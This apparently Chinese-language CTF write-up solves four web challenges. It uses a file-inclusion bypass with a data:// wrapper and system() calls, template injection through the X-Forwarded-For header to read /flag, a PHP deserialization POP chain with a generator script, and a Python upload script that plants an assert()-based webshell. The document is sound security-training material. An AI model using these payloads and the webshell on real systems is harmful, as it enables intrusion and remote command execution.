队伍名称：Ice

队伍成员：Icem0use

解出题目：

                 web：  Easy_include

                              Web_IP

                              Web_pop

                              PCREMagic





### 题目解题过程
#### Easy_include
发现php代码

```php
<?php
error_reporting(0);
//flag in flag.php
$file=$_GET['file'];
if(isset($file))
{
    if(!preg_match("/flag/i",$file))
    {
        include($file);
    }
    else
    {
        echo("no no no ~ ");
    }
}
else
{
    highlight_file(__FILE__);
}

?> 
```

通过代码审计 发现题目过滤了flag关键字并且存在文件包含漏洞  由于题目提示flag在flag.php里 于是利用伪协议读取 由于过滤了flag 利用通配符绕过

```php
 ?file=data://text/plain,<?php%20system('cat fla?.php');?>
```

打开源代码后发现flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737797462609-5a4e4b01-f56d-4859-b082-6c8dead4f8c5.png)

####  WEB_IP
打开靶机

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737797930275-6e900950-cf21-4694-9905-086a58651f62.png)

点击flag后出现ip提示

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737797982680-78ffe4f8-c84e-4162-b79d-6bef6a50f4a2.png)

没什么头绪点击hint寻找线索 打开源代码后发现一段注释 询问为什么知道我的ip

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737798101582-77183a0e-7f1e-4c64-94dc-31188073dcd2.png)

猜测肯是ssti模板注入 利用burpsite抓包尝试通过<font style="color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);">X-Forwarded-For参数注入</font>

```php
X-Forwarded-For：{{2*2}}
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737798514987-55eede97-8d07-46fc-bb60-ef2f91de57fc.png)

发现回显为4 尝试能否执行php语句

```php
X-Forwarded-For:{{system('ls')}}
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737798823105-d3aa4ef8-525c-4e2c-a4fd-fce1dbbe77d6.png)

查看响应包发现flag文件接着读取flag

```php
X-Forwarded-For:{{system('cat flag')}}
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737798936754-14906f9d-a7f0-4082-b61e-c2e25f46829b.png)

发现不是正确的 接着寻找更目录下的文件

```php
X-Forwarded-For:{{system('ls /')}}
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737798992563-87f15731-c4ae-45da-890a-1a5c7b94484c.png)

```php
X-Forwarded-For:{{system('cat /flag')}}
```

得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737799030375-9a12f15f-0f3c-495b-bc36-ee8974709de2.png)

#### Web_pop
根据题目提示得知是php反序列化

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
class Start{
    public $name;
    protected $func;
 
    public function __destruct()
    {
        echo "Welcome to QHCTF 2025, ".$this->name;
    }
 
    public function __isset($var)
    {
        ($this->func)();
    }
}
 
class Sec{
    private $obj;
    private $var;
 
    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }
 
    public function __invoke()
    {
        echo file_get_contents('/flag');
    }
}
 
class Easy{
    public $cla;
 
    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}
 
class eeee{
    public $obj;
 
    public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
}
 
if(isset($_POST['pop'])){
    unserialize($_POST['pop']);
}
```

发现Sec类中存在可以输出flag的函数  于是作为pop链尾端构建pop链子

```php
a=new Start();
$a->name=new Sec();
$a->name->obj=new Easy();
$a->name->var=new eeee();
$a->name->var->obj=new Start();
$a->name->var->obj->func=new Sec();
```

输出pop链的脚本为

```php
<?php

class Start{
    public $name;
    public $func;
}

class Sec{
    public $obj;
    public $var;
}

class Easy
{
    public $cla;
}

class eeee{
    public $obj;

}
$a=new Start();
$a->name=new Sec();
$a->name->obj=new Easy();
$a->name->var=new eeee();
$a->name->var->obj=new Start();
$a->name->var->obj->func=new Sec();
echo serialize($a);

```

得到pop链

```php
O:5:"Start":2:{s:4:"name";O:3:"Sec":2:{s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}s:3:"var";O:4:"eeee":1:{s:3:"obj";O:5:"Start":2:{s:4:"name";N;s:4:"func";O:3:"Sec":2:{s:3:"obj";N;s:3:"var";N;}}}}s:4:"func";N;}
```

传参后得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737799731994-0f615433-e7a5-47c1-b22b-e17a68272611.png)

#### PCREMagic
```php
 <?php
function is_php($data){
     return preg_match('/<\?php.*?eval.*?\(.*?\).*?\?>/is', $data);
}

if(empty($_FILES)) {
    die(show_source(__FILE__));
}

$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);
$data = file_get_contents($_FILES['file']['tmp_name']);
if (is_php($data)) {
    echo "bad request";
} else {
    if (!is_dir($user_dir)) {
        mkdir($user_dir, 0755, true);
    }
    $path = $user_dir . '/' . random_int(0, 10) . '.php';
    move_uploaded_file($_FILES['file']['tmp_name'], $path);

    header("Location: $path", true, 303);
    exit;
}
?> 1
```

通过代码审计 可能需要传马 利用脚本上传

```php
import requests
def upload_file_content(file_content, filename, upload_url):
    # 直接使用文件内容创建一个可上传的对象
    files = {'file': (filename, file_content)}

    # 发送POST请求上传文件内容，并设置不跟随重定向
    try:
        response = requests.post(upload_url, files=files, allow_redirects=False)
    except requests.exceptions.RequestException as e:
        print(f"请求过程中发生错误: {e}")
        return
    # 检查响应状态码以判断是否上传成功
    if response.status_code == 200:
        print("文件上传成功")
        print("响应头部：")
        for key, value in response.headers.items():
            print(f"{key}: {value}")
        # 打印响应主体内容
        print("响应主体：")
        print(response.text)
    elif response.status_code in [301, 302, 303, 307, 308]:
        print(f"收到重定向响应，状态码: {response.status_code}")
        if 'Location' in response.headers:
            print(f"重定向位置: {response.headers['Location']}")
        else:
            print("没有提供重定向位置。")
    else:
        print(f"文件上传失败，HTTP状态码: {response.status_code}")
        print(f"响应内容: {response.text}")
file_content = ("<?php assert($_POST[1]);?>").encode('utf-8')  # 将字符串转换为字节流
filename = "example.txt"  # 你可以为你的文件指定一个名称
upload_url = 'http://challenge.qihangcup.cn:34764/'  # 替换为你的PHP脚本的实际URL
upload_file_content(file_content, filename, upload_url)
```

上传成功后的得到上传位置 利用中国蚁剑连接

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737799969595-b85e35dd-672f-427b-a7ca-a6dce4c4281d.png)

添加数据成功后在/flag里面发现flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737800054436-ec2cd300-7fe6-4c76-b994-c53cd7aff7a7.png)

